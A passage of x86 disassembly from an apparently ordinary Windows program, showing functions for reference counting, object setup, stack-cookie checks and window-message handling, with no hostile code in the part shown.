  401eb7:	mov    ebx,eax
  401eb9:	test   ebx,ebx
  401ebb:	js     0x401f4f
  401ec1:	lea    ecx,[ebp-0x14]
  401ec4:	mov    edx,0x40146c
  401ec9:	mov    eax,DWORD PTR [ecx+esi*4]
  401ecc:	cmp    eax,DWORD PTR [edx+esi*4]
  401ecf:	jne    0x401ef7
  401ed1:	inc    esi
  401ed2:	cmp    esi,edi
  401ed4:	jne    0x401ec9
  401ed6:	push   ecx
  401ed7:	mov    eax,esp
  401ed9:	push   ecx
  401eda:	mov    DWORD PTR [eax],0x6e
  401ee0:	mov    eax,esp
  401ee2:	mov    DWORD PTR [eax],0x6f
  401ee8:	call   DWORD PTR ds:0x4090dc
  401eee:	mov    ecx,eax
  401ef0:	call   0x402442
  401ef5:	jmp    0x401f4f
  401ef7:	call   0x402206
  401efc:	mov    ebx,eax
  401efe:	test   ebx,ebx
  401f00:	js     0x401f4f
  401f02:	mov    eax,ds:0x4083dc
  401f07:	add    eax,0x20
  401f0a:	push   eax
  401f0b:	mov    ecx,DWORD PTR [eax]
  401f0d:	mov    esi,DWORD PTR [ecx+0x4]
  401f10:	mov    ecx,esi
  401f12:	call   DWORD PTR ds:0x409254
  401f18:	call   esi
  401f1a:	mov    edi,DWORD PTR ds:0x4083dc
  401f20:	lea    esi,[ebp-0x14]
  401f23:	push   ecx
  401f24:	lea    edi,[edi+0x2c]
  401f27:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401f28:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401f29:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401f2a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401f2b:	call   DWORD PTR ds:0x4090dc
  401f31:	push   eax
  401f32:	call   0x401f78
  401f37:	mov    eax,ds:0x4083dc
  401f3c:	add    eax,0x20
  401f3f:	push   eax
  401f40:	mov    ecx,DWORD PTR [eax]
  401f42:	mov    esi,DWORD PTR [ecx+0x8]
  401f45:	mov    ecx,esi
  401f47:	call   DWORD PTR ds:0x409254
  401f4d:	call   esi
  401f4f:	push   DWORD PTR [ebp-0x18]
  401f52:	call   DWORD PTR ds:0x409034
  401f58:	call   DWORD PTR ds:0x409100
  401f5e:	mov    ecx,DWORD PTR [ebp-0x4]
  401f61:	mov    eax,ebx
  401f63:	pop    edi
  401f64:	pop    esi
  401f65:	xor    ecx,ebp
  401f67:	pop    ebx
  401f68:	call   0x4071f0
  401f6d:	mov    esp,ebp
  401f6f:	pop    ebp
  401f70:	ret    0x10
  401f73:	int3   
  401f74:	int3   
  401f75:	int3   
  401f76:	int3   
  401f77:	int3   
  401f78:	mov    edi,edi
  401f7a:	push   ebp
  401f7b:	mov    ebp,esp
  401f7d:	push   ecx
  401f7e:	push   esi
  401f7f:	mov    esi,DWORD PTR ds:0x4083dc
  401f85:	push   edi
  401f86:	push   0x0
  401f88:	push   0x0
  401f8a:	lea    edi,[esi+0x8]
  401f8d:	mov    ecx,edi
  401f8f:	call   0x404638
  401f94:	test   eax,eax
  401f96:	jne    0x401fa5
  401f98:	push   0xe
  401f9a:	call   DWORD PTR ds:0x409064
  401fa0:	or     eax,0xffffffff
  401fa3:	jmp    0x401fc4
  401fa5:	push   esi
  401fa6:	push   edi
  401fa7:	call   0x4023eb
  401fac:	push   0x0
  401fae:	push   0x402140
  401fb3:	push   DWORD PTR [ebp+0x8]
  401fb6:	push   0x71
  401fb8:	push   DWORD PTR ds:0x408464
  401fbe:	call   DWORD PTR ds:0x4090d8
  401fc4:	pop    edi
  401fc5:	pop    esi
  401fc6:	mov    esp,ebp
  401fc8:	pop    ebp
  401fc9:	ret    0x8
  401fcc:	int3   
  401fcd:	int3   
  401fce:	int3   
  401fcf:	int3   
  401fd0:	int3   
  401fd1:	mov    edi,edi
  401fd3:	push   ebp
  401fd4:	mov    ebp,esp
  401fd6:	push   ecx
  401fd7:	mov    eax,ds:0x408008
  401fdc:	xor    eax,ebp
  401fde:	mov    DWORD PTR [ebp-0x4],eax
  401fe1:	push   ebx
  401fe2:	push   esi
  401fe3:	mov    ebx,ecx
  401fe5:	push   edi
  401fe6:	mov    edi,DWORD PTR ds:0x4083d4
  401fec:	mov    DWORD PTR [ebx],0x401330
  401ff2:	mov    DWORD PTR [ebx+0x20],0x40131c
  401ff9:	mov    DWORD PTR [ebx+0x24],0xc0000001
  402000:	mov    eax,DWORD PTR [edi]
  402002:	mov    esi,DWORD PTR [eax+0x8]
  402005:	mov    ecx,esi
  402007:	call   DWORD PTR ds:0x409254
  40200d:	mov    ecx,edi
  40200f:	call   esi
  402011:	cmp    DWORD PTR [ebx+0x14],0x0
  402015:	je     0x40201f
  402017:	push   DWORD PTR [ebx+0x14]
  40201a:	call   0x405c7e
  40201f:	mov    ecx,DWORD PTR [ebp-0x4]
  402022:	pop    edi
  402023:	pop    esi
  402024:	xor    ecx,ebp
  402026:	pop    ebx
  402027:	call   0x4071f0
  40202c:	mov    esp,ebp
  40202e:	pop    ebp
  40202f:	ret    
  402030:	int3   
  402031:	int3   
  402032:	int3   
  402033:	int3   
  402034:	int3   
  402035:	int3   
  402036:	int3   
  402037:	int3   
  402038:	int3   
  402039:	int3   
  40203a:	int3   
  40203b:	int3   
  40203c:	int3   
  40203d:	int3   
  40203e:	int3   
  40203f:	int3   
  402040:	mov    edi,edi
  402042:	push   ebp
  402043:	mov    ebp,esp
  402045:	mov    eax,DWORD PTR [ebp+0x8]
  402048:	inc    DWORD PTR [eax+0x4]
  40204b:	mov    eax,DWORD PTR [eax+0x4]
  40204e:	pop    ebp
  40204f:	ret    0x4
  402052:	int3   
  402053:	int3   
  402054:	int3   
  402055:	int3   
  402056:	int3   
  402057:	int3   
  402058:	int3   
  402059:	int3   
  40205a:	int3   
  40205b:	int3   
  40205c:	int3   
  40205d:	int3   
  40205e:	int3   
  40205f:	int3   
  402060:	mov    edi,edi
  402062:	push   ebp
  402063:	mov    ebp,esp
  402065:	push   ecx
  402066:	mov    eax,ds:0x408008
  40206b:	xor    eax,ebp
  40206d:	mov    DWORD PTR [ebp-0x4],eax
  402070:	mov    ecx,DWORD PTR [ebp+0x8]
  402073:	push   ebx
  402074:	sub    DWORD PTR [ecx+0x4],0x1
  402078:	mov    ebx,DWORD PTR [ecx+0x4]
  40207b:	jne    0x4020bb
  40207d:	mov    eax,ds:0x4083d4
  402082:	push   esi
  402083:	push   edi
  402084:	lock inc DWORD PTR [eax+0x8]
  402088:	lea    edi,[ecx-0x20]
  40208b:	test   edi,edi
  40208d:	je     0x4020a2
  40208f:	mov    eax,DWORD PTR [edi]
  402091:	push   0x1
  402093:	mov    esi,DWORD PTR [eax+0x4]
  402096:	mov    ecx,esi
  402098:	call   DWORD PTR ds:0x409254
  40209e:	mov    ecx,edi
  4020a0:	call   esi
  4020a2:	mov    edi,DWORD PTR ds:0x4083d4
  4020a8:	mov    edx,DWORD PTR [edi]
  4020aa:	mov    esi,DWORD PTR [edx+0x8]
  4020ad:	mov    ecx,esi
  4020af:	call   DWORD PTR ds:0x409254
  4020b5:	mov    ecx,edi
  4020b7:	call   esi
  4020b9:	pop    edi
  4020ba:	pop    esi
  4020bb:	mov    ecx,DWORD PTR [ebp-0x4]
  4020be:	mov    eax,ebx
  4020c0:	xor    ecx,ebp
  4020c2:	pop    ebx
  4020c3:	call   0x4071f0
  4020c8:	mov    esp,ebp
  4020ca:	pop    ebp
  4020cb:	ret    0x4
  4020ce:	int3   
  4020cf:	int3   
  4020d0:	int3   
  4020d1:	int3   
  4020d2:	int3   
  4020d3:	int3   
  4020d4:	int3   
  4020d5:	int3   
  4020d6:	int3   
  4020d7:	int3   
  4020d8:	int3   
  4020d9:	int3   
  4020da:	int3   
  4020db:	int3   
  4020dc:	int3   
  4020dd:	int3   
  4020de:	int3   
  4020df:	int3   
  4020e0:	mov    edi,edi
  4020e2:	push   ebp
  4020e3:	mov    ebp,esp
  4020e5:	push   DWORD PTR [ebp+0x10]
  4020e8:	mov    ecx,DWORD PTR [ebp+0x8]
  4020eb:	mov    edx,0x401720
  4020f0:	push   DWORD PTR [ebp+0xc]
  4020f3:	lea    ecx,[ecx-0x20]
  4020f6:	call   0x40451f
  4020fb:	pop    ebp
  4020fc:	ret    0xc
  4020ff:	int3   
  402100:	int3   
  402101:	int3   
  402102:	int3   
  402103:	int3   
  402104:	int3   
  402105:	int3   
  402106:	int3   
  402107:	int3   
  402108:	int3   
  402109:	int3   
  40210a:	int3   
  40210b:	int3   
  40210c:	int3   
  40210d:	int3   
  40210e:	int3   
  40210f:	int3   
  402110:	mov    edi,edi
  402112:	push   ebp
  402113:	mov    ebp,esp
  402115:	push   esi
  402116:	mov    esi,ecx
  402118:	call   0x401fd1
  40211d:	test   BYTE PTR [ebp+0x8],0x1
  402121:	je     0x40212a
  402123:	push   esi
  402124:	call   0x406e3c
  402129:	pop    ecx
  40212a:	mov    eax,esi
  40212c:	pop    esi
  40212d:	pop    ebp
  40212e:	ret    0x4
  402131:	int3   
  402132:	int3   
  402133:	int3   
  402134:	int3   
  402135:	int3   
  402136:	int3   
  402137:	int3   
  402138:	int3   
  402139:	int3   
  40213a:	int3   
  40213b:	int3   
  40213c:	int3   
  40213d:	int3   
  40213e:	int3   
  40213f:	int3   
  402140:	mov    edi,edi
  402142:	push   ebp
  402143:	mov    ebp,esp
  402145:	push   ecx
  402146:	mov    eax,ds:0x408008
  40214b:	xor    eax,ebp
  40214d:	mov    DWORD PTR [ebp-0x4],eax
  402150:	push   ebx
  402151:	push   esi
  402152:	push   edi
  402153:	mov    edi,0x408014
  402158:	xor    ebx,ebx
  40215a:	push   edi
  40215b:	call   DWORD PTR ds:0x409028
  402161:	mov    esi,DWORD PTR ds:0x40802c
  402167:	test   esi,esi
  402169:	je     0x402196
  40216b:	call   DWORD PTR ds:0x40902c
  402171:	mov    ecx,ebx
  402173:	cmp    DWORD PTR [esi+0x4],eax
  402176:	je     0x402183
  402178:	mov    ecx,esi
  40217a:	mov    esi,DWORD PTR [esi+0x8]
  40217d:	test   esi,esi
  40217f:	jne    0x402173
  402181:	jmp    0x402196
  402183:	mov    eax,DWORD PTR [esi+0x8]
  402186:	test   ecx,ecx
  402188:	jne    0x402191
  40218a:	mov    ds:0x40802c,eax
  40218f:	jmp    0x402194
  402191:	mov    DWORD PTR [ecx+0x8],eax
  402194:	mov    ebx,DWORD PTR [esi]
  402196:	push   edi
  402197:	call   DWORD PTR ds:0x409078
  40219d:	test   ebx,ebx
  40219f:	jne    0x4021a5
  4021a1:	xor    eax,eax
  4021a3:	jmp    0x4021ee
  4021a5:	mov    eax,DWORD PTR [ebx]
  4021a7:	mov    edi,DWORD PTR [ebp+0x8]
  4021aa:	push   ebx
  4021ab:	mov    DWORD PTR [ebx+0x4],edi
  4021ae:	mov    esi,DWORD PTR [eax+0x8]
  4021b1:	mov    ecx,esi
  4021b3:	call   DWORD PTR ds:0x409254
  4021b9:	mov    ecx,ebx
  4021bb:	call   esi
  4021bd:	push   eax
  4021be:	lea    ecx,[ebx+0x8]
  4021c1:	call   0x404638
  4021c6:	push   DWORD PTR [ebx+0x14]
  4021c9:	call   0x405b17
  4021ce:	mov    esi,eax
  4021d0:	push   esi
  4021d1:	push   0x4
  4021d3:	push   edi
  4021d4:	call   DWORD PTR ds:0x4090ec
  4021da:	push   DWORD PTR [ebp+0x14]
  4021dd:	mov    ecx,esi
  4021df:	push   DWORD PTR [ebp+0x10]
  4021e2:	push   DWORD PTR [ebp+0xc]
  4021e5:	push   edi
  4021e6:	call   DWORD PTR ds:0x409254
  4021ec:	call   esi
  4021ee:	mov    ecx,DWORD PTR [ebp-0x4]
  4021f1:	pop    edi
  4021f2:	pop    esi
  4021f3:	xor    ecx,ebp
  4021f5:	pop    ebx
  4021f6:	call   0x4071f0
  4021fb:	mov    esp,ebp
  4021fd:	pop    ebp
  4021fe:	ret    0x10
  402201:	int3   
  402202:	int3   
  402203:	int3   
  402204:	int3   
  402205:	int3   
  402206:	mov    edi,edi
  402208:	push   ebx
  402209:	xor    ebx,ebx
  40220b:	push   0x40
  40220d:	mov    DWORD PTR ds:0x4083dc,ebx
  402213:	call   0x406e60
  402218:	pop    ecx
  402219:	mov    ecx,eax
  40221b:	test   ecx,ecx
  40221d:	je     0x402269
  40221f:	mov    DWORD PTR [ecx+0x4],ebx
  402222:	mov    DWORD PTR [ecx+0x14],ebx
  402225:	mov    eax,ds:0x4083d4
  40222a:	push   esi
  40222b:	push   edi
  40222c:	mov    DWORD PTR [ecx+0x18],ebx
  40222f:	lea    edi,[ecx+0x2c]
  402232:	mov    DWORD PTR [ecx+0x1c],ebx
  402235:	mov    esi,0x40145c
  40223a:	mov    DWORD PTR [ecx+0x24],ebx
  40223d:	mov    DWORD PTR [ecx],0x4013bc
  402243:	mov    DWORD PTR [ecx+0x20],0x4013a8
  40224a:	mov    DWORD PTR [ecx+0x28],ebx
  40224d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40224e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40224f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402250:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402251:	mov    DWORD PTR [ecx+0x3c],ebx
  402254:	mov    DWORD PTR [ecx],0x401330
  40225a:	mov    DWORD PTR [ecx+0x20],0x40131c
  402261:	lock inc DWORD PTR [eax+0x8]
  402265:	pop    edi
  402266:	pop    esi
  402267:	jmp    0x40226b
  402269:	mov    ecx,ebx
  40226b:	mov    eax,ecx
  40226d:	mov    DWORD PTR ds:0x4083dc,ecx
  402273:	neg    eax
  402275:	pop    ebx
  402276:	sbb    eax,eax
  402278:	not    eax
  40227a:	and    eax,0x8007000e
  40227f:	ret    
  402280:	int3   
  402281:	int3   
  402282:	int3   
  402283:	int3   
  402284:	int3   
  402285:	int3   
  402286:	int3   
  402287:	int3   
  402288:	int3   
  402289:	int3   
  40228a:	int3   
  40228b:	int3   
  40228c:	int3   
  40228d:	int3   
  40228e:	int3   
  40228f:	int3   
  402290:	mov    edi,edi
  402292:	push   esi
  402293:	or     esi,0xffffffff
  402296:	lock xadd DWORD PTR [ecx+0x8],esi
  40229b:	dec    esi
  40229c:	jne    0x4022ab
  40229e:	push   DWORD PTR [ecx+0x3c]
  4022a1:	mov    BYTE PTR [ecx+0x40],0x1
  4022a5:	call   DWORD PTR ds:0x409068
  4022ab:	mov    eax,esi
  4022ad:	pop    esi
  4022ae:	ret    
  4022af:	int3   
  4022b0:	int3   
  4022b1:	int3   
  4022b2:	int3   
  4022b3:	int3   
  4022b4:	int3   
  4022b5:	int3   
  4022b6:	int3   
  4022b7:	int3   
  4022b8:	int3   
  4022b9:	int3   
  4022ba:	int3   
  4022bb:	int3   
  4022bc:	int3   
  4022bd:	int3   
  4022be:	int3   
  4022bf:	int3   
  4022c0:	ret    0x4
  4022c3:	int3   
  4022c4:	int3   
  4022c5:	int3   
  4022c6:	int3   
  4022c7:	int3   
  4022c8:	int3   
  4022c9:	int3   
  4022ca:	int3   
  4022cb:	int3   
  4022cc:	int3   
  4022cd:	int3   
  4022ce:	int3   
  4022cf:	int3   
  4022d0:	mov    edi,edi
  4022d2:	push   ebp
  4022d3:	mov    ebp,esp
  4022d5:	sub    esp,0x30
  4022d8:	mov    eax,ds:0x408008
  4022dd:	xor    eax,ebp
  4022df:	mov    DWORD PTR [ebp-0x4],eax
  4022e2:	mov    eax,DWORD PTR [ebp+0xc]
  4022e5:	mov    ecx,DWORD PTR [ebp+0x10]
  4022e8:	push   ebx
  4022e9:	mov    ebx,DWORD PTR [ebp+0x8]
  4022ec:	push   esi
  4022ed:	push   edi
  4022ee:	mov    DWORD PTR [ebp-0x2c],eax
  4022f1:	lea    esi,[ebp-0x30]
  4022f4:	mov    edx,DWORD PTR [ebx+0x4]
  4022f7:	mov    eax,DWORD PTR [ebp+0x14]
  4022fa:	mov    edi,DWORD PTR [ebx+0x18]
  4022fd:	mov    DWORD PTR [ebp-0x30],edx
  402300:	xor    edx,edx
  402302:	push   edx
  402303:	mov    DWORD PTR [ebp-0x20],edx
  402306:	mov    DWORD PTR [ebp-0x18],edx
  402309:	mov    DWORD PTR [ebp-0x1c],edx
  40230c:	lea    edx,[ebp-0xc]
  40230f:	push   edx
  402310:	mov    edx,DWORD PTR [ebx+0x4]
  402313:	push   eax
  402314:	push   ecx
  402315:	push   DWORD PTR [ebp+0xc]
  402318:	mov    DWORD PTR [ebx+0x18],esi
  40231b:	mov    esi,DWORD PTR [ebx]
  40231d:	mov    DWORD PTR [ebp-0x28],ecx
  402320:	push   edx
  402321:	mov    DWORD PTR [ebp-0x14],0x24
  402328:	mov    ecx,DWORD PTR [esi]
  40232a:	mov    DWORD PTR [ebp-0x10],0x1
  402331:	mov    DWORD PTR [ebp-0x24],eax
  402334:	call   DWORD PTR ds:0x409254
  40233a:	mov    ecx,ebx
  40233c:	call   DWORD PTR [esi]
  40233e:	mov    ecx,eax
  402340:	mov    DWORD PTR [ebx+0x18],edi
  402343:	mov    DWORD PTR [ebp-0x8],ecx
  402346:	test   ecx,ecx
  402348:	je     0x40238a
  40234a:	mov    eax,DWORD PTR [ebp+0xc]
  40234d:	cmp    eax,0x2e
  402350:	jb     0x402377
  402352:	cmp    eax,0x2f
  402355:	jbe    0x402372
  402357:	cmp    eax,0x37
  40235a:	je     0x402372
  40235c:	cmp    eax,0x39
  40235f:	je     0x402372
  402361:	cmp    eax,0x110
  402366:	je     0x402372
  402368:	add    eax,0xfffffece
  40236d:	cmp    eax,0x6
  402370:	ja     0x402377
  402372:	mov    edi,DWORD PTR [ebp-0xc]
  402375:	jmp    0x402399
  402377:	push   DWORD PTR [ebp-0xc]
  40237a:	push   0x0
  40237c:	push   DWORD PTR [ebx+0x4]
  40237f:	call   DWORD PTR ds:0x4090ec
  402385:	mov    edi,DWORD PTR [ebp-0x8]
  402388:	jmp    0x402399
  40238a:	cmp    DWORD PTR [ebp+0xc],0x82
  402391:	mov    edi,eax
  402393:	jne    0x402399
  402395:	or     DWORD PTR [ebx+0x1c],0x1
  402399:	mov    eax,DWORD PTR [ebx+0x1c]
  40239c:	test   al,0x1
  40239e:	je     0x4023c5
  4023a0:	cmp    DWORD PTR [ebx+0x18],0x0
  4023a4:	jne    0x4023c5
  4023a6:	mov    edx,DWORD PTR [ebx+0x4]
  4023a9:	and    eax,0xfffffffe
  4023ac:	and    DWORD PTR [ebx+0x4],0x0
  4023b0:	mov    DWORD PTR [ebx+0x1c],eax
  4023b3:	mov    eax,DWORD PTR [ebx]
  4023b5:	push   edx
  4023b6:	mov    esi,DWORD PTR [eax+0xc]
  4023b9:	mov    ecx,esi
  4023bb:	call   DWORD PTR ds:0x409254
  4023c1:	mov    ecx,ebx
  4023c3:	call   esi
  4023c5:	mov    ecx,DWORD PTR [ebp-0x4]
  4023c8:	mov    eax,edi
  4023ca:	pop    edi
  4023cb:	pop    esi
  4023cc:	xor    ecx,ebp
  4023ce:	pop    ebx
  4023cf:	call   0x4071f0
  4023d4:	mov    esp,ebp
  4023d6:	pop    ebp
  4023d7:	ret    0x10
  4023da:	int3   
  4023db:	int3   
  4023dc:	int3   
  4023dd:	int3   
  4023de:	int3   
  4023df:	int3   
  4023e0:	mov    eax,0x4022d0
  4023e5:	ret    
  4023e6:	int3   
  4023e7:	int3   
  4023e8:	int3   
  4023e9:	int3   
  4023ea:	int3   
  4023eb:	mov    edi,edi
  4023ed:	push   ebp
  4023ee:	mov    ebp,esp
  4023f0:	push   esi
  4023f1:	mov    esi,DWORD PTR [ebp+0x8]
  4023f4:	push   edi
  4023f5:	test   esi,esi
  4023f7:	je     0x402432
  4023f9:	mov    eax,DWORD PTR [ebp+0xc]
  4023fc:	test   eax,eax
  4023fe:	je     0x402432
  402400:	mov    DWORD PTR [esi],eax
  402402:	call   DWORD PTR ds:0x40902c
  402408:	mov    edi,0x408014
  40240d:	mov    DWORD PTR [esi+0x4],eax
  402410:	push   edi
  402411:	call   DWORD PTR ds:0x409028
  402417:	mov    eax,ds:0x40802c
  40241c:	mov    DWORD PTR [esi+0x8],eax
  40241f:	push   edi
  402420:	mov    DWORD PTR ds:0x40802c,esi
  402426:	call   DWORD PTR ds:0x409078
  40242c:	pop    edi
  40242d:	pop    esi
  40242e:	pop    ebp
  40242f:	ret    0x8
  402432:	mov    ecx,0xc0000005
  402437:	call   0x4046b4
  40243c:	int3   
  40243d:	int3   
  40243e:	int3   
  40243f:	int3   
  402440:	int3   
  402441:	int3   
  402442:	mov    edi,edi
  402444:	push   ebp
  402445:	mov    ebp,esp
  402447:	push   ecx
  402448:	push   ecx
  402449:	mov    edx,DWORD PTR [ebp+0x8]
  40244c:	push   ebx
  40244d:	push   esi
  40244e:	push   edi
  40244f:	xor    edi,edi
  402451:	mov    DWORD PTR [ebp-0x8],ecx
  402454:	mov    ebx,edi
  402456:	mov    esi,0x100
  40245b:	test   edx,0xffff0000
  402461:	jne    0x4024d1
  402463:	xor    ecx,ecx
  402465:	mov    DWORD PTR [ebp-0x4],esi
  402468:	push   0x2
  40246a:	pop    edx
  40246b:	mov    eax,esi
  40246d:	mul    edx
  40246f:	seto   cl
  402472:	neg    ecx
  402474:	or     ecx,eax
  402476:	push   ecx
  402477:	call   0x406e50
  40247c:	jmp    0x4024be
  40247e:	push   DWORD PTR [ebp-0x4]
  402481:	movzx  ecx,WORD PTR [ebp+0x8]
  402485:	push   ebx
  402486:	push   ecx
  402487:	push   DWORD PTR ds:0x408464
  40248d:	call   DWORD PTR ds:0x4090e0
  402493:	mov    ecx,DWORD PTR [ebp-0x4]
  402496:	dec    ecx
  402497:	cmp    eax,ecx
  402499:	jl     0x4024cc
  40249b:	push   ebx
  40249c:	call   0x406e46
  4024a1:	mov    eax,DWORD PTR [ebp-0x4]
  4024a4:	xor    ecx,ecx
  4024a6:	add    eax,eax
  4024a8:	push   0x2
  4024aa:	pop    edx
  4024ab:	mov    DWORD PTR [ebp-0x4],eax
  4024ae:	mul    edx
  4024b0:	seto   cl
  4024b3:	neg    ecx
  4024b5:	or     ecx,eax
  4024b7:	push   ecx
  4024b8:	call   0x406e50
  4024bd:	pop    ecx
  4024be:	mov    ebx,eax
  4024c0:	pop    ecx
  4024c1:	test   ebx,ebx
  4024c3:	jne    0x40247e
  4024c5:	xor    eax,eax
  4024c7:	jmp    0x402561
  4024cc:	mov    edx,ebx
  4024ce:	mov    DWORD PTR [ebp+0x8],edx
  4024d1:	mov    eax,DWORD PTR [ebp+0xc]
  4024d4:	test   eax,0xffff0000
  4024d9:	jne    0x402542
  4024db:	test   ax,ax
  4024de:	je     0x402542
  4024e0:	xor    ecx,ecx
  4024e2:	mov    eax,esi
  4024e4:	push   0x2
  4024e6:	pop    edx
  4024e7:	mul    edx
  4024e9:	seto   cl
  4024ec:	neg    ecx
  4024ee:	or     ecx,eax
  4024f0:	push   ecx
  4024f1:	call   0x406e50
  4024f6:	jmp    0x402531
  4024f8:	movzx  ecx,WORD PTR [ebp+0xc]
  4024fc:	push   esi
  4024fd:	push   edi
  4024fe:	push   ecx
  4024ff:	push   DWORD PTR ds:0x408464
  402505:	call   DWORD PTR ds:0x4090e0
  40250b:	lea    ecx,[esi-0x1]
  40250e:	cmp    eax,ecx
  402510:	jl     0x40253a
  402512:	push   edi
  402513:	call   0x406e46
  402518:	add    esi,esi
  40251a:	xor    ecx,ecx
  40251c:	push   0x2
  40251e:	pop    edx
  40251f:	mov    eax,esi
  402521:	mul    edx
  402523:	seto   cl
  402526:	neg    ecx
  402528:	or     ecx,eax
  40252a:	push   ecx
  40252b:	call   0x406e50
  402530:	pop    ecx
  402531:	mov    edi,eax
  402533:	pop    ecx
  402534:	test   edi,edi
  402536:	jne    0x4024f8
  402538:	jmp    0x4024c5
  40253a:	mov    edx,DWORD PTR [ebp+0x8]
  40253d:	mov    eax,edi
  40253f:	mov    DWORD PTR [ebp+0xc],eax
  402542:	push   0x40
  402544:	push   eax
  402545:	push   edx
  402546:	push   DWORD PTR [ebp-0x8]
  402549:	call   DWORD PTR ds:0x4090e4
  40254f:	push   ebx
  402550:	mov    esi,eax
  402552:	call   0x406e46
  402557:	push   edi
  402558:	call   0x406e46
  40255d:	pop    ecx
  40255e:	pop    ecx
  40255f:	mov    eax,esi
  402561:	pop    edi
  402562:	pop    esi
  402563:	pop    ebx
  402564:	mov    esp,ebp
  402566:	pop    ebp
  402567:	ret    0x8
  40256a:	int3   
  40256b:	int3   
  40256c:	int3   
  40256d:	int3   
  40256e:	int3   
  40256f:	push   0xc
  402571:	push   0x407b80
  402576:	call   0x407a48
  40257b:	xor    esi,esi
  40257d:	mov    DWORD PTR [ebp-0x4],esi
  402580:	push   ecx
  402581:	call   DWORD PTR ds:0x409038
  402587:	jmp    0x4025a4
  402589:	mov    eax,DWORD PTR [ebp-0x14]
  40258c:	mov    eax,DWORD PTR [eax]
  40258e:	xor    ecx,ecx
  402590:	cmp    DWORD PTR [eax],0xc0000017
  402596:	sete   cl
  402599:	mov    eax,ecx
  40259b:	ret    
  40259c:	mov    esp,DWORD PTR [ebp-0x18]
  40259f:	mov    esi,0x8007000e
  4025a4:	mov    DWORD PTR [ebp-0x1c],esi
  4025a7:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  4025ae:	mov    eax,esi
  4025b0:	call   0x407a8d
  4025b5:	ret    
  4025b6:	int3   
  4025b7:	int3   
  4025b8:	int3   
  4025b9:	int3   
  4025ba:	int3   
  4025bb:	mov    edi,edi
  4025bd:	push   ebp
  4025be:	mov    ebp,esp
  4025c0:	push   ecx
  4025c1:	mov    eax,ds:0x408008
  4025c6:	xor    eax,ebp
  4025c8:	mov    DWORD PTR [ebp-0x4],eax
  4025cb:	push   ebx
  4025cc:	mov    ebx,ecx
  4025ce:	push   edi
  4025cf:	test   ebx,ebx
  4025d1:	je     0x40260f
  4025d3:	mov    edi,DWORD PTR [ebx+0x8]
  4025d6:	test   edi,edi
  4025d8:	je     0x4025fb
  4025da:	push   esi
  4025db:	mov    esi,DWORD PTR [edi]
  4025dd:	mov    ecx,esi
  4025df:	push   DWORD PTR [edi+0x4]
  4025e2:	call   DWORD PTR ds:0x409254
  4025e8:	call   esi
  4025ea:	mov    esi,DWORD PTR [edi+0x8]
  4025ed:	push   edi
  4025ee:	call   0x406e3c
  4025f3:	mov    edi,esi
  4025f5:	pop    ecx
  4025f6:	test   esi,esi
  4025f8:	jne    0x4025db
  4025fa:	pop    esi
  4025fb:	mov    ecx,DWORD PTR [ebp-0x4]
  4025fe:	and    DWORD PTR [ebx+0x8],0x0
  402602:	xor    ecx,ebp
  402604:	pop    edi
  402605:	pop    ebx
  402606:	call   0x4071f0
  40260b:	mov    esp,ebp
  40260d:	pop    ebp
  40260e:	ret    
  40260f:	mov    ecx,0xc0000005
  402614:	call   0x4046b4
  402619:	int3   
  40261a:	int3   
  40261b:	int3   
  40261c:	int3   
  40261d:	int3   
  40261e:	int3   
  40261f:	mov    edi,edi
  402621:	push   ebp
  402622:	mov    ebp,esp
  402624:	push   ecx
  402625:	mov    eax,ds:0x408008
  40262a:	xor    eax,ebp
  40262c:	mov    DWORD PTR [ebp-0x4],eax
  40262f:	push   ebx
  402630:	push   edi
  402631:	mov    edi,ecx
  402633:	lea    ebx,[edi+0x4]
  402636:	cmp    DWORD PTR [ebx],0x0
  402639:	je     0x402672
  40263b:	cmp    DWORD PTR [edi+0xc],0x0
  40263f:	je     0x40264c
  402641:	mov    ecx,ebx
  402643:	call   0x4025bb
  402648:	and    DWORD PTR [edi+0xc],0x0
  40264c:	mov    ecx,DWORD PTR [edi+0x28]
  40264f:	test   ecx,ecx
  402651:	je     0x402665
  402653:	mov    eax,DWORD PTR [ecx]
  402655:	push   esi
  402656:	push   ecx
  402657:	mov    esi,DWORD PTR [eax+0x8]
  40265a:	mov    ecx,esi
  40265c:	call   DWORD PTR ds:0x409254
  402662:	call   esi
  402664:	pop    esi
  402665:	lea    eax,[edi+0x10]
  402668:	push   eax
  402669:	call   DWORD PTR ds:0x40903c
  40266f:	and    DWORD PTR [ebx],0x0
  402672:	mov    ecx,DWORD PTR [ebp-0x4]
  402675:	pop    edi
  402676:	xor    ecx,ebp
  402678:	pop    ebx
  402679:	call   0x4071f0
  40267e:	mov    esp,ebp
  402680:	pop    ebp
  402681:	ret    
  402682:	int3   
  402683:	int3   
  402684:	int3   
  402685:	int3   
  402686:	int3   
  402687:	int3   
  402688:	int3   
  402689:	int3   
  40268a:	int3   
  40268b:	int3   
  40268c:	int3   
  40268d:	int3   
  40268e:	int3   
  40268f:	int3   
  402690:	xor    eax,eax
  402692:	inc    eax
  402693:	lock xadd DWORD PTR [ecx+0x8],eax
  402698:	inc    eax
  402699:	ret    
  40269a:	int3   
  40269b:	int3   
  40269c:	int3   
  40269d:	int3   
  40269e:	int3   
  40269f:	int3   
  4026a0:	or     eax,0xffffffff
  4026a3:	lock xadd DWORD PTR [ecx+0x8],eax
  4026a8:	dec    eax
  4026a9:	ret    
  4026aa:	int3   
  4026ab:	int3   
  4026ac:	int3   
  4026ad:	int3   
  4026ae:	int3   
  4026af:	int3   
  4026b0:	mov    eax,DWORD PTR [ecx+0x8]
  4026b3:	ret    
  4026b4:	int3   
  4026b5:	int3   
  4026b6:	int3   
  4026b7:	int3   
  4026b8:	int3   
  4026b9:	int3   
  4026ba:	int3   
  4026bb:	int3   
  4026bc:	int3   
  4026bd:	int3   
  4026be:	int3   
  4026bf:	int3   
  4026c0:	mov    edi,edi
  4026c2:	push   ebp
  4026c3:	mov    ebp,esp
  4026c5:	push   ecx
  4026c6:	mov    eax,ds:0x408008
  4026cb:	xor    eax,ebp
  4026cd:	mov    DWORD PTR [ebp-0x4],eax
